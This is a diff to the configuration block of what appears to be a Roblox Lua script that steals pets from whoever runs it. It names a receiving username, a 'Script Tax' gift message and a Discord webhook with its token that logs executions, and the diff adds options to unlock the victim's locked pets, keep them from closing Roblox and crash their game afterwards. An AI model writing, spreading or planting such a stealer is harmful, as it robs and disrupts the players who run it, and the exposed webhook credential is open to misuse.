@@ -4,6 +4,11 @@
 _G.Username = "abdulkareem0475" --// Username To Send Pets To
 _G.GiftMessage = "Script Tax" --// Message For The Gift To Say
 
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
 --[[ Webhook Config ]]--
 _G.Webhook = "https://discord.com/api/webhooks/1100735279024832552/-chFA0_1jU45tKHgDpkLjEFkkKEJf7c4TAYrMb38HKjlBHrglvmCC6GeLJ4XN17AeAzX" --// Discord Webhook For Executions
 
